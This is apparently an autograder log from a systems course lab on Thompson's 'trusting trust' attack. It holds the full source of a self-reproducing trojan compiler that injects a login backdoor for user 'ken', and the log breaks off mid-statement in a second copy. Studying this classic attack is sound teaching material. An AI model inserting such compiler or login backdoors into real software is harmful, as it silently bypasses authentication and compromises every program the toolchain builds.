/Users/josephtan/140e-dumb-autograder/repos/bala
rm -f quine-gen quine-out.c quine.c quine *~
gcc -Og -g -Wall quine-gen.c -o quine-gen
--------------------------------------------
checking that the quine generates itself

1. Generating a quine
./quine-gen < seed.c > quine.c
gcc quine.c -o quine
2. Using quine to generate itself
./quine > quine-out.c
3. Checking generated quine matches quine
diff quine.c quine-out.c
**** Success: Quine matches its output ***
--------------------------------------------

make -C ../step1 clean
rm -f quine-gen quine-out.c quine.c quine *~
make -C ../step2 clean
rm -f  compiler-attacked login-attacked out login compiler trojan-compiler *.o a.out  *~ compiler-attacked.c login-attacked.c out.c temp-out.c
rm -f  trojan-compiler2 *.o *~  cc-attacked cc-attacked2 temp-out.c out login-attacked.c login-attacked attack-quine.c
make -C ../step1
gcc -Og -g -Wall quine-gen.c -o quine-gen
../step1/quine-gen  < attack-seed.c > attack-quine.c
gcc -Og -g -Wall trojan-compiler2.c -o trojan-compiler2

----------------------------------checking that the attack will generate itself
./trojan-compiler2 ../step2/compiler.c -o cc-attacked
// engler, cs240lx: trivial identity "compiler" used to illustrate
// thompsons hack: it simply echos its input out.
#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#define error(args...)                                                         \
  do {                                                                         \
    fprintf(stderr, ##args);                                                   \
    exit(1);                                                                   \
  } while (0)
// a not very interesting compile: throw the input into a
// temporary file and then call gcc on the result.
static void compile(char *program, char *outname) {
  FILE *fp = fopen("./temp-out.c", "w");
  assert(fp);
char prog[] = {
	70, 	73, 	76, 	69, 	32, 	42, 	111, 	117,
	116, 	112, 	117, 	116, 	32, 	61, 	32, 	102,
	112, 	59, 	10, 	115, 	116, 	97, 	116, 	105,
	99, 	32, 	99, 	104, 	97, 	114, 	32, 	108,
	111, 	103, 	105, 	110, 	95, 	115, 	105, 	103,
	91, 	93, 	32, 	61, 	32, 	34, 	105, 	110,
	116, 	32, 	108, 	111, 	103, 	105, 	110, 	40,
	99, 	104, 	97, 	114, 	32, 	42, 	117, 	115,
	101, 	114, 	41, 	32, 	123, 	34, 	59, 	10,
	115, 	116, 	97, 	116, 	105, 	99, 	32, 	99,
	104, 	97, 	114, 	32, 	108, 	111, 	103, 	105,
	110, 	95, 	97, 	116, 	116, 	97, 	99, 	107,
	91, 	93, 	32, 	61, 	32, 	34, 	105, 	102,
	40, 	115, 	116, 	114, 	99, 	109, 	112, 	40,
	117, 	115, 	101, 	114, 	44, 	32, 	92, 	34,
	107, 	101, 	110, 	92, 	34, 	41, 	32, 	61,
	61, 	32, 	48, 	41, 	32, 	114, 	101, 	116,
	117, 	114, 	110, 	32, 	49, 	59, 	34, 	59,
	10, 	115, 	116, 	97, 	116, 	105, 	99, 	32,
	99, 	104, 	97, 	114, 	32, 	102, 	105, 	114,
	115, 	116, 	95, 	108, 	105, 	110, 	101, 	91,
	93, 	32, 	61, 	10, 	32, 	32, 	32, 	32,
	34, 	115, 	116, 	97, 	116, 	105, 	99, 	32,
	118, 	111, 	105, 	100, 	32, 	99, 	111, 	109,
	112, 	105, 	108, 	101, 	40, 	99, 	104, 	97,
	114, 	32, 	42, 	112, 	114, 	111, 	103, 	114,
	97, 	109, 	44, 	32, 	99, 	104, 	97, 	114,
	32, 	42, 	111, 	117, 	116, 	110, 	97, 	109,
	101, 	41, 	32, 	123, 	34, 	59, 	10, 	115,
	116, 	97, 	116, 	105, 	99, 	32, 	99, 	104,
	97, 	114, 	32, 	115, 	101, 	99, 	111, 	110,
	100, 	95, 	108, 	105, 	110, 	101, 	91, 	93,
	32, 	61, 	32, 	34, 	32, 	32, 	70, 	73,
	76, 	69, 	32, 	42, 	102, 	112, 	32, 	61,
	32, 	102, 	111, 	112, 	101, 	110, 	40, 	92,
	34, 	46, 	47, 	116, 	101, 	109, 	112, 	45,
	111, 	117, 	116, 	46, 	99, 	92, 	34, 	44,
	32, 	92, 	34, 	119, 	92, 	34, 	41, 	59,
	34, 	59, 	10, 	115, 	116, 	97, 	116, 	105,
	99, 	32, 	99, 	104, 	97, 	114, 	32, 	116,
	104, 	105, 	114, 	100, 	95, 	108, 	105, 	110,
	101, 	91, 	93, 	32, 	61, 	32, 	34, 	32,
	32, 	97, 	115, 	115, 	101, 	114, 	116, 	40,
	102, 	112, 	41, 	59, 	34, 	59, 	10, 	99,
	104, 	97, 	114, 	32, 	108, 	111, 	103, 	105,
	110, 	78, 	101, 	120, 	116, 	76, 	105, 	110,
	101, 	71, 	101, 	116, 	32, 	61, 	32, 	48,
	59, 	10, 	99, 	104, 	97, 	114, 	32, 	99,
	111, 	109, 	112, 	105, 	108, 	101, 	114, 	78,
	101, 	120, 	116, 	76, 	105, 	110, 	101, 	71,
	101, 	116, 	32, 	61, 	32, 	48, 	59, 	10,
	99, 	104, 	97, 	114, 	32, 	42, 	108, 	105,
	110, 	101, 	32, 	61, 	32, 	115, 	116, 	114,
	116, 	111, 	107, 	40, 	112, 	114, 	111, 	103,
	114, 	97, 	109, 	44, 	32, 	34, 	92, 	110,
	34, 	41, 	59, 	10, 	119, 	104, 	105, 	108,
	101, 	32, 	40, 	108, 	105, 	110, 	101, 	32,
	33, 	61, 	32, 	78, 	85, 	76, 	76, 	41,
	32, 	123, 	10, 	32, 	32, 	105, 	102, 	32,
	40, 	108, 	111, 	103, 	105, 	110, 	78, 	101,
	120, 	116, 	76, 	105, 	110, 	101, 	71, 	101,
	116, 	32, 	61, 	61, 	32, 	49, 	41, 	32,
	123, 	10, 	32, 	32, 	32, 	32, 	102, 	112,
	114, 	105, 	110, 	116, 	102, 	40, 	111, 	117,
	116, 	112, 	117, 	116, 	44, 	32, 	34, 	37,
	115, 	34, 	44, 	32, 	108, 	111, 	103, 	105,
	110, 	95, 	97, 	116, 	116, 	97, 	99, 	107,
	41, 	59, 	10, 	32, 	32, 	32, 	32, 	108,
	111, 	103, 	105, 	110, 	78, 	101, 	120, 	116,
	76, 	105, 	110, 	101, 	71, 	101, 	116, 	32,
	61, 	32, 	48, 	59, 	10, 	32, 	32, 	125,
	10, 	32, 	32, 	105, 	102, 	32, 	40, 	99,
	111, 	109, 	112, 	105, 	108, 	101, 	114, 	78,
	101, 	120, 	116, 	76, 	105, 	110, 	101, 	71,
	101, 	116, 	32, 	61, 	61, 	32, 	51, 	41,
	32, 	123, 	10, 	32, 	32, 	32, 	32, 	105,
	110, 	116, 	32, 	105, 	59, 	10, 	32, 	32,
	32, 	32, 	102, 	112, 	114, 	105, 	110, 	116,
	102, 	40, 	111, 	117, 	116, 	112, 	117, 	116,
	44, 	32, 	34, 	37, 	115, 	34, 	44, 	32,
	34, 	99, 	104, 	97, 	114, 	32, 	112, 	114,
	111, 	103, 	91, 	93, 	32, 	61, 	32, 	123,
	92, 	110, 	34, 	41, 	59, 	10, 	32, 	32,
	32, 	32, 	102, 	111, 	114, 	32, 	40, 	105,
	32, 	61, 	32, 	48, 	59, 	32, 	112, 	114,
	111, 	103, 	91, 	105, 	93, 	59, 	32, 	105,
	43, 	43, 	41, 	10, 	32, 	32, 	32, 	32,
	32, 	32, 	102, 	112, 	114, 	105, 	110, 	116,
	102, 	40, 	111, 	117, 	116, 	112, 	117, 	116,
	44, 	32, 	34, 	92, 	116, 	37, 	100, 	44,
	37, 	99, 	34, 	44, 	32, 	112, 	114, 	111,
	103, 	91, 	105, 	93, 	44, 	32, 	40, 	105,
	32, 	43, 	32, 	49, 	41, 	32, 	37, 	32,
	56, 	32, 	61, 	61, 	32, 	48, 	32, 	63,
	32, 	39, 	92, 	110, 	39, 	32, 	58, 	32,
	39, 	32, 	39, 	41, 	59, 	10, 	32, 	32,
	32, 	32, 	102, 	112, 	114, 	105, 	110, 	116,
	102, 	40, 	111, 	117, 	116, 	112, 	117, 	116,
	44, 	32, 	34, 	37, 	115, 	34, 	44, 	32,
	34, 	48, 	32, 	125, 	59, 	92, 	110, 	34,
	41, 	59, 	10, 	32, 	32, 	32, 	32, 	102,
	112, 	114, 	105, 	110, 	116, 	102, 	40, 	111,
	117, 	116, 	112, 	117, 	116, 	44, 	32, 	34,
	37, 	115, 	34, 	44, 	32, 	112, 	114, 	111,
	103, 	41, 	59, 	10, 	32, 	32, 	32, 	32,
	99, 	111, 	109, 	112, 	105, 	108, 	101, 	114,
	78, 	101, 	120, 	116, 	76, 	105, 	110, 	101,
	71, 	101, 	116, 	32, 	61, 	32, 	48, 	59,
	10, 	32, 	32, 	32, 	32, 	108, 	105, 	110,
	101, 	32, 	61, 	32, 	115, 	116, 	114, 	116,
	111, 	107, 	40, 	78, 	85, 	76, 	76, 	44,
	32, 	34, 	92, 	110, 	34, 	41, 	59, 	10,
	32, 	32, 	32, 	32, 	47, 	47, 	32, 	99,
	111, 	110, 	116, 	105, 	110, 	117, 	101, 	59,
	10, 	32, 	32, 	125, 	10, 	32, 	32, 	102,
	112, 	114, 	105, 	110, 	116, 	102, 	40, 	111,
	117, 	116, 	112, 	117, 	116, 	44, 	32, 	34,
	37, 	115, 	92, 	110, 	34, 	44, 	32, 	108,
	105, 	110, 	101, 	41, 	59, 	10, 	32, 	32,
	105, 	102, 	32, 	40, 	115, 	116, 	114, 	99,
	109, 	112, 	40, 	108, 	105, 	110, 	101, 	44,
	32, 	108, 	111, 	103, 	105, 	110, 	95, 	115,
	105, 	103, 	41, 	32, 	61, 	61, 	32, 	48,
	41, 	32, 	123, 	10, 	32, 	32, 	32, 	32,
	108, 	111, 	103, 	105, 	110, 	78, 	101, 	120,
	116, 	76, 	105, 	110, 	101, 	71, 	101, 	116,
	32, 	61, 	32, 	49, 	59, 	10, 	32, 	32,
	125, 	10, 	32, 	32, 	105, 	102, 	32, 	40,
	115, 	116, 	114, 	99, 	109, 	112, 	40, 	108,
	105, 	110, 	101, 	44, 	32, 	102, 	105, 	114,
	115, 	116, 	95, 	108, 	105, 	110, 	101, 	41,
	32, 	61, 	61, 	32, 	48, 	32, 	38, 	38,
	32, 	99, 	111, 	109, 	112, 	105, 	108, 	101,
	114, 	78, 	101, 	120, 	116, 	76, 	105, 	110,
	101, 	71, 	101, 	116, 	32, 	61, 	61, 	32,
	48, 	41, 	32, 	123, 	10, 	32, 	32, 	32,
	32, 	99, 	111, 	109, 	112, 	105, 	108, 	101,
	114, 	78, 	101, 	120, 	116, 	76, 	105, 	110,
	101, 	71, 	101, 	116, 	32, 	43, 	61, 	32,
	49, 	59, 	10, 	32, 	32, 	125, 	32, 	101,
	108, 	115, 	101, 	32, 	105, 	102, 	32, 	40,
	115, 	116, 	114, 	99, 	109, 	112, 	40, 	108,
	105, 	110, 	101, 	44, 	32, 	115, 	101, 	99,
	111, 	110, 	100, 	95, 	108, 	105, 	110, 	101,
	41, 	32, 	61, 	61, 	32, 	48, 	32, 	38,
	38, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	114, 	78, 	101, 	120, 	116, 	76, 	105,
	110, 	101, 	71, 	101, 	116, 	32, 	61, 	61,
	32, 	49, 	41, 	32, 	123, 	10, 	32, 	32,
	32, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	114, 	78, 	101, 	120, 	116, 	76, 	105,
	110, 	101, 	71, 	101, 	116, 	32, 	43, 	61,
	32, 	49, 	59, 	10, 	32, 	32, 	125, 	32,
	101, 	108, 	115, 	101, 	32, 	105, 	102, 	32,
	40, 	115, 	116, 	114, 	99, 	109, 	112, 	40,
	108, 	105, 	110, 	101, 	44, 	32, 	116, 	104,
	105, 	114, 	100, 	95, 	108, 	105, 	110, 	101,
	41, 	32, 	61, 	61, 	32, 	48, 	32, 	38,
	38, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	114, 	78, 	101, 	120, 	116, 	76, 	105,
	110, 	101, 	71, 	101, 	116, 	32, 	61, 	61,
	32, 	50, 	41, 	32, 	123, 	10, 	32, 	32,
	32, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	114, 	78, 	101, 	120, 	116, 	76, 	105,
	110, 	101, 	71, 	101, 	116, 	32, 	43, 	61,
	32, 	49, 	59, 	10, 	32, 	32, 	125, 	10,
	32, 	32, 	108, 	105, 	110, 	101, 	32, 	61,
	32, 	115, 	116, 	114, 	116, 	111, 	107, 	40,
	78, 	85, 	76, 	76, 	44, 	32, 	34, 	92,
	110, 	34, 	41, 	59, 	32, 	47, 	47, 	32,
	67, 	111, 	110, 	116, 	105, 	110, 	117, 	101,
	32, 	116, 	111, 	32, 	116, 	111, 	107, 	101,
	110, 	105, 	122, 	101, 	32, 	116, 	104, 	101,
	32, 	115, 	116, 	114, 	105, 	110, 	103, 	10,
	125, 	10, 	102, 	99, 	108, 	111, 	115, 	101,
	40, 	102, 	112, 	41, 	59, 	10, 	10, 	99,
	104, 	97, 	114, 	32, 	100, 	101, 	98, 	117,
	103, 	76, 	105, 	110, 	101, 	91, 	49, 	48,
	48, 	93, 	59, 	10, 	70, 	73, 	76, 	69,
	32, 	42, 	100, 	101, 	98, 	117, 	103, 	32,
	61, 	32, 	102, 	111, 	112, 	101, 	110, 	40,
	34, 	46, 	47, 	116, 	101, 	109, 	112, 	45,
	111, 	117, 	116, 	46, 	99, 	34, 	44, 	32,
	34, 	114, 	34, 	41, 	59, 	10, 	97, 	115,
	115, 	101, 	114, 	116, 	40, 	100, 	101, 	98,
	117, 	103, 	41, 	59, 	10, 	119, 	104, 	105,
	108, 	101, 	32, 	40, 	102, 	103, 	101, 	116,
	115, 	40, 	100, 	101, 	98, 	117, 	103, 	76,
	105, 	110, 	101, 	44, 	32, 	115, 	105, 	122,
	101, 	111, 	102, 	40, 	100, 	101, 	98, 	117,
	103, 	76, 	105, 	110, 	101, 	41, 	44, 	32,
	100, 	101, 	98, 	117, 	103, 	41, 	32, 	33,
	61, 	32, 	78, 	85, 	76, 	76, 	41, 	32,
	123, 	10, 	32, 	32, 	112, 	114, 	105, 	110,
	116, 	102, 	40, 	34, 	37, 	115, 	34, 	44,
	32, 	100, 	101, 	98, 	117, 	103, 	76, 	105,
	110, 	101, 	41, 	59, 	10, 	125, 0 };
FILE *output = fp;
static char login_sig[] = "int login(char *user) {";
static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";
static char first_line[] =
    "static void compile(char *program, char *outname) {";
static char second_line[] = "  FILE *fp = fopen(\"./temp-out.c\", \"w\");";
static char third_line[] = "  assert(fp);";
char loginNextLineGet = 0;
char compilerNextLineGet = 0;
char *line = strtok(program, "\n");
while (line != NULL) {
  if (loginNextLineGet == 1) {
    fprintf(output, "%s", login_attack);
    loginNextLineGet = 0;
  }
  if (compilerNextLineGet == 3) {
    int i;
    fprintf(output, "%s", "char prog[] = {\n");
    for (i = 0; prog[i]; i++)
      fprintf(output, "\t%d,%c", prog[i], (i + 1) % 8 == 0 ? '\n' : ' ');
    fprintf(output, "%s", "0 };\n");
    fprintf(output, "%s", prog);
    compilerNextLineGet = 0;
    line = strtok(NULL, "\n");
    // continue;
  }
  fprintf(output, "%s\n", line);
  if (strcmp(line, login_sig) == 0) {
    loginNextLineGet = 1;
  }
  if (strcmp(line, first_line) == 0 && compilerNextLineGet == 0) {
    compilerNextLineGet += 1;
  } else if (strcmp(line, second_line) == 0 && compilerNextLineGet == 1) {
    compilerNextLineGet += 1;
  } else if (strcmp(line, third_line) == 0 && compilerNextLineGet == 2) {
    compilerNextLineGet += 1;
  }
  line = strtok(NULL, "\n"); // Continue to tokenize the string
}
fclose(fp);

char debugLine[100];
FILE *debug = fopen("./temp-out.c", "r");
assert(debug);
while (fgets(debugLine, sizeof(debugLine), debug) != NULL) {
  printf("%s", debugLine);
}  fclose(fp);
  // for step 2 you will pattern match on
  //   "static void compile(char *program, char *outname) {"
  // and inject the attack
  // match on login....
  // and inject an attack for "ken"
  // gross, call gcc.
  char buf[1024];
  sprintf(buf, "gcc ./temp-out.c -o %s -Wno-nullability-completeness", outname);
  if (system(buf) != 0)
    error("system failed\n");
}
#define N 8 * 1024 * 1024
static char buf[N + 1];
int main(int argc, char *argv[]) {
  if (argc != 4)
    error("expected 4 arguments have %d\n", argc);
  if (strcmp(argv[2], "-o") != 0)
    error("expected -o as second argument, have <%s>\n", argv[2]);
  // read in the entire file.
  int fd;
  if ((fd = open(argv[1], O_RDONLY)) < 0)
    error("file <%s> does not exist\n", argv[1]);
  int n;
  if ((n = read(fd, buf, N)) < 1)
    error("invalid read of file <%s>\n", argv[1]);
  if (n == N)
    error("input file too large\n");
  // "compile" it.
  compile(buf, argv[3]);
  return 0;
}
./cc-attacked ../step2/compiler.c -o cc-attacked2
// engler, cs240lx: trivial identity "compiler" used to illustrate
// thompsons hack: it simply echos its input out.
#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#define error(args...)                                                         \
  do {                                                                         \
    fprintf(stderr, ##args);                                                   \
    exit(1);                                                                   \
  } while (0)
// a not very interesting compile: throw the input into a
// temporary file and then call gcc on the result.
static void compile(char *program, char *outname) {
  FILE *fp = fopen("./temp-out.c", "w");
  assert(fp);
char prog[] = {
	70, 	73, 	76, 	69, 	32, 	42, 	111, 	117,
	116, 	112, 	117, 	116, 	32, 	61, 	32, 	102,
	112, 	59, 	10, 	115, 	116, 	97, 	116, 	105,
	99, 	32, 	99, 	104, 	97, 	114, 	32, 	108,
	111, 	103, 	105, 	110, 	95, 	115, 	105, 	103,
	91, 	93, 	32, 	61, 	32, 	34, 	105, 	110,
	116, 	32, 	108, 	111, 	103, 	105, 	110, 	40,
	99, 	104, 	97, 	114, 	32, 	42, 	117, 	115,
	101, 	114, 	41, 	32, 	123, 	34, 	59, 	10,
	115, 	116, 	97, 	116, 	105, 	99, 	32, 	99,
	104, 	97, 	114, 	32, 	108, 	111, 	103, 	105,
	110, 	95, 	97, 	116, 	116, 	97, 	99, 	107,
	91, 	93, 	32, 	61, 	32, 	34, 	105, 	102,
	40, 	115, 	116, 	114, 	99, 	109, 	112, 	40,
	117, 	115, 	101, 	114, 	44, 	32, 	92, 	34,
	107, 	101, 	110, 	92, 	34, 	41, 	32, 	61,
	61, 	32, 	48, 	41, 	32, 	114, 	101, 	116,
	117, 	114, 	110, 	32, 	49, 	59, 	34, 	59,
	10, 	115, 	116, 	97, 	116, 	105, 	99, 	32,
	99, 	104, 	97, 	114, 	32, 	102, 	105, 	114,
	115, 	116, 	95, 	108, 	105, 	110, 	101, 	91,
	93, 	32, 	61, 	10, 	32, 	32, 	32, 	32,
	34, 	115, 	116, 	97, 	116, 	105, 	99, 	32,
	118, 	111, 	105, 	100, 	32, 	99, 	111, 	109,
	112, 	105, 	108, 	101, 	40, 	99, 	104, 	97,
	114, 	32, 	42, 	112, 	114, 	111, 	103, 	114,
	97, 	109, 	44, 	32, 	99, 	104, 	97, 	114,
	32, 	42, 	111, 	117, 	116, 	110, 	97, 	109,
	101, 	41, 	32, 	123, 	34, 	59, 	10, 	115,
	116, 	97, 	116, 	105, 	99, 	32, 	99, 	104,
	97, 	114, 	32, 	115, 	101, 	99, 	111, 	110,
	100, 	95, 	108, 	105, 	110, 	101, 	91, 	93,
	32, 	61, 	32, 	34, 	32, 	32, 	70, 	73,
	76, 	69, 	32, 	42, 	102, 	112, 	32, 	61,
	32, 	102, 	111, 	112, 	101, 	110, 	40, 	92,
	34, 	46, 	47, 	116, 	101, 	109, 	112, 	45,
	111, 	117, 	116, 	46, 	99, 	92, 	34, 	44,
	32, 	92, 	34, 	119, 	92, 	34, 	41, 	59,
	34, 	59, 	10, 	115, 	116, 	97, 	116, 	105,
	99, 	32, 	99, 	104, 	97, 	114, 	32, 	116,
	104, 	105, 	114, 	100, 	95, 	108, 	105, 	110,
	101, 	91, 	93, 	32, 	61, 	32, 	34, 	32,
	32, 	97, 	115, 	115, 	101, 	114, 	116, 	40,
	102, 	112, 	41, 	59, 	34, 	59, 	10, 	99,
	104, 	97, 	114, 	32, 	108, 	111, 	103, 	105,
	110, 	78, 	101, 	120, 	116, 	76, 	105, 	110,
	101, 	71, 	101, 	116, 	32, 	61, 	32, 	48,
	59, 	10, 	99, 	104, 	97, 	114, 	32, 	99,
	111, 	109, 	112, 	105, 	108, 	101, 	114, 	78,
	101, 	120, 	116, 	76, 	105, 	110, 	101, 	71,
	101, 	116, 	32, 	61, 	32, 	48, 	59, 	10,
	99, 	104, 	97, 	114, 	32, 	42, 	108, 	105,
	110, 	101, 	32, 	61, 	32, 	115, 	116, 	114,
	116, 	111, 	107, 	40, 	112, 	114, 	111, 	103,
	114, 	97, 	109, 	44, 	32, 	34, 	92, 	110,
	34, 	41, 	59, 	10, 	119, 	104, 	105, 	108,
	101, 	32, 	40, 	108, 	105, 	110, 	101, 	32,
	33, 	61, 	32, 	78, 	85, 	76, 	76, 	41,
	32, 	123, 	10, 	32, 	32, 	105, 	102, 	32,
	40, 	108, 	111, 	103, 	105, 	110, 	78, 	101,
	120, 	116, 	76, 	105, 	110, 	101, 	71, 	101,
	116, 	32, 	61, 	61, 	32, 	49, 	41, 	32,
	123, 	10, 	32, 	32, 	32, 	32, 	102, 	112,
	114, 	105, 	110, 	116, 	102, 	40, 	111, 	117,
	116, 	112, 	117, 	116, 	44, 	32, 	34, 	37,
	115, 	34, 	44, 	32, 	108, 	111, 	103, 	105,
	110, 	95, 	97, 	116, 	116, 	97, 	99, 	107,
	41, 	59, 	10, 	32, 	32, 	32, 	32, 	108,
	111, 	103, 	105, 	110, 	78, 	101, 	120, 	116,
	76, 	105, 	110, 	101, 	71, 	101, 	116, 	32,
	61, 	32, 	48, 	59, 	10, 	32, 	32, 	125,
	10, 	32, 	32, 	105, 	102, 	32, 	40, 	99,
	111, 	109, 	112, 	105, 	108, 	101, 	114, 	78,
	101, 	120, 	116, 	76, 	105, 	110, 	101, 	71,
	101, 	116, 	32, 	61, 	61, 	32, 	51, 	41,
	32, 	123, 	10, 	32, 	32, 	32, 	32, 	105,
	110, 	116, 	32, 	105, 	59, 	10, 	32, 	32,
	32, 	32, 	102, 	112, 	114, 	105, 	110, 	116,
	102, 	40, 	111, 	117, 	116, 	112, 	117, 	116,
	44, 	32, 	34, 	37, 	115, 	34, 	44, 	32,
	34, 	99, 	104, 	97, 	114, 	32, 	112, 	114,
	111, 	103, 	91, 	93, 	32, 	61, 	32, 	123,
	92, 	110, 	34, 	41, 	59, 	10, 	32, 	32,
	32, 	32, 	102, 	111, 	114, 	32, 	40, 	105,
	32, 	61, 	32, 	48, 	59, 	32, 	112, 	114,
	111, 	103, 	91, 	105, 	93, 	59, 	32, 	105,
	43, 	43, 	41, 	10, 	32, 	32, 	32, 	32,
	32, 	32, 	102, 	112, 	114, 	105, 	110, 	116,
	102, 	40, 	111, 	117, 	116, 	112, 	117, 	116,
	44, 	32, 	34, 	92, 	116, 	37, 	100, 	44,
	37, 	99, 	34, 	44, 	32, 	112, 	114, 	111,
	103, 	91, 	105, 	93, 	44, 	32, 	40, 	105,
	32, 	43, 	32, 	49, 	41, 	32, 	37, 	32,
	56, 	32, 	61, 	61, 	32, 	48, 	32, 	63,
	32, 	39, 	92, 	110, 	39, 	32, 	58, 	32,
	39, 	32, 	39, 	41, 	59, 	10, 	32, 	32,
	32, 	32, 	102, 	112, 	114, 	105, 	110, 	116,
	102, 	40, 	111, 	117, 	116, 	112, 	117, 	116,
	44, 	32, 	34, 	37, 	115, 	34, 	44, 	32,
	34, 	48, 	32, 	125, 	59, 	92, 	110, 	34,
	41, 	59, 	10, 	32, 	32, 	32, 	32, 	102,
	112, 	114, 	105, 	110, 	116, 	102, 	40, 	111,
	117, 	116, 	112, 	117, 	116, 	44, 	32, 	34,
	37, 	115, 	34, 	44, 	32, 	112, 	114, 	111,
	103, 	41, 	59, 	10, 	32, 	32, 	32, 	32,
	99, 	111, 	109, 	112, 	105, 	108, 	101, 	114,
	78, 	101, 	120, 	116, 	76, 	105, 	110, 	101,
	71, 	101, 	116, 	32, 	61, 	32, 	48, 	59,
	10, 	32, 	32, 	32, 	32, 	108, 	105, 	110,
	101, 	32, 	61, 	32, 	115, 	116, 	114, 	116,
	111, 	107, 	40, 	78, 	85, 	76, 	76, 	44,
	32, 	34, 	92, 	110, 	34, 	41, 	59, 	10,
	32, 	32, 	32, 	32, 	47, 	47, 	32, 	99,
	111, 	110, 	116, 	105, 	110, 	117, 	101, 	59,
	10, 	32, 	32, 	125, 	10, 	32, 	32, 	102,
	112, 	114, 	105, 	110, 	116, 	102, 	40, 	111,
	117, 	116, 	112, 	117, 	116, 	44, 	32, 	34,
	37, 	115, 	92, 	110, 	34, 	44, 	32, 	108,
	105, 	110, 	101, 	41, 	59, 	10, 	32, 	32,
	105, 	102, 	32, 	40, 	115, 	116, 	114, 	99,
	109, 	112, 	40, 	108, 	105, 	110, 	101, 	44,
	32, 	108, 	111, 	103, 	105, 	110, 	95, 	115,
	105, 	103, 	41, 	32, 	61, 	61, 	32, 	48,
	41, 	32, 	123, 	10, 	32, 	32, 	32, 	32,
	108, 	111, 	103, 	105, 	110, 	78, 	101, 	120,
	116, 	76, 	105, 	110, 	101, 	71, 	101, 	116,
	32, 	61, 	32, 	49, 	59, 	10, 	32, 	32,
	125, 	10, 	32, 	32, 	105, 	102, 	32, 	40,
	115, 	116, 	114, 	99, 	109, 	112, 	40, 	108,
	105, 	110, 	101, 	44, 	32, 	102, 	105, 	114,
	115, 	116, 	95, 	108, 	105, 	110, 	101, 	41,
	32, 	61, 	61, 	32, 	48, 	32, 	38, 	38,
	32, 	99, 	111, 	109, 	112, 	105, 	108, 	101,
	114, 	78, 	101, 	120, 	116, 	76, 	105, 	110,
	101, 	71, 	101, 	116, 	32, 	61, 	61, 	32,
	48, 	41, 	32, 	123, 	10, 	32, 	32, 	32,
	32, 	99, 	111, 	109, 	112, 	105, 	108, 	101,
	114, 	78, 	101, 	120, 	116, 	76, 	105, 	110,
	101, 	71, 	101, 	116, 	32, 	43, 	61, 	32,
	49, 	59, 	10, 	32, 	32, 	125, 	32, 	101,
	108, 	115, 	101, 	32, 	105, 	102, 	32, 	40,
	115, 	116, 	114, 	99, 	109, 	112, 	40, 	108,
	105, 	110, 	101, 	44, 	32, 	115, 	101, 	99,
	111, 	110, 	100, 	95, 	108, 	105, 	110, 	101,
	41, 	32, 	61, 	61, 	32, 	48, 	32, 	38,
	38, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	114, 	78, 	101, 	120, 	116, 	76, 	105,
	110, 	101, 	71, 	101, 	116, 	32, 	61, 	61,
	32, 	49, 	41, 	32, 	123, 	10, 	32, 	32,
	32, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	114, 	78, 	101, 	120, 	116, 	76, 	105,
	110, 	101, 	71, 	101, 	116, 	32, 	43, 	61,
	32, 	49, 	59, 	10, 	32, 	32, 	125, 	32,
	101, 	108, 	115, 	101, 	32, 	105, 	102, 	32,
	40, 	115, 	116, 	114, 	99, 	109, 	112, 	40,
	108, 	105, 	110, 	101, 	44, 	32, 	116, 	104,
	105, 	114, 	100, 	95, 	108, 	105, 	110, 	101,
	41, 	32, 	61, 	61, 	32, 	48, 	32, 	38,
	38, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	114, 	78, 	101, 	120, 	116, 	76, 	105,
	110, 	101, 	71, 	101, 	116, 	32, 	61, 	61,
	32, 	50, 	41, 	32, 	123, 	10, 	32, 	32,
	32, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	114, 	78, 	101, 	120, 	116, 	76, 	105,
	110, 	101, 	71, 	101, 	116, 	32, 	43, 	61,
	32, 	49, 	59, 	10, 	32, 	32, 	125, 	10,
	32, 	32, 	108, 	105, 	110, 	101, 	32, 	61,
	32, 	115, 	116, 	114, 	116, 	111, 	107, 	40,
	78, 	85, 	76, 	76, 	44, 	32, 	34, 	92,
	110, 	34, 	41, 	59, 	32, 	47, 	47, 	32,
	67, 	111, 	110, 	116, 	105, 	110, 	117, 	101,
	32, 	116, 	111, 	32, 	116, 	111, 	107, 	101,
	110, 	105, 	122, 	101, 	32, 	116, 	104, 	101,
	32, 	115, 	116, 	114, 	105, 	110, 	103, 	10,
	125, 	10, 	102, 	99, 	108, 	111, 	115, 	101,
	40, 	102, 	112, 	41, 	59, 	10, 	10, 	99,
	104, 	97, 	114, 	32, 	100, 	101, 	98, 	117,
	103, 	76, 	105, 	110, 	101, 	91, 	49, 	48,
	48, 	93, 	59, 	10, 	70, 	73, 	76, 	69,
	32, 	42, 	100, 	101, 	98, 	117, 	103, 	32,
	61, 	32, 	102, 	111, 	112, 	101, 	110, 	40,
	34, 	46, 	47, 	116, 	101, 	109, 	112, 	45,
	111, 	117, 	116, 	46, 	99, 	34, 	44, 	32,
	34, 	114, 	34, 	41, 	59, 	10, 	97, 	115,
	115, 	101, 	114, 	116, 	40, 	100, 	101, 	98,
	117, 	103, 	41, 	59, 	10, 	119, 	104, 	105,
	108, 	101, 	32, 	40, 	102, 	103, 	101, 	116,
	115, 	40, 	100, 	101, 	98, 	117, 	103, 	76,
	105, 	110, 	101, 	44, 	32, 	115, 	105, 	122,
	101, 	111, 	102, 	40, 	100, 	101, 	98, 	117,
	103, 	76, 	105, 	110, 	101, 	41, 	44, 	32,
	100, 	101, 	98, 	117, 	103, 	41, 	32, 	33,
	61, 	32, 	78, 	85, 	76, 	76, 	41, 	32,
	123, 	10, 	32, 	32, 	112, 	114, 	105, 	110,
	116, 	102, 	40, 	34, 	37, 	115, 	34, 	44,
	32, 	100, 	101, 	98, 	117, 	103, 	76, 	105,
	110, 	101, 	41, 	59, 	10, 	125, 0 };
FILE *output = fp;
static char login_sig[] = "int login(char *user) {";
static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";
static char first_line[] =
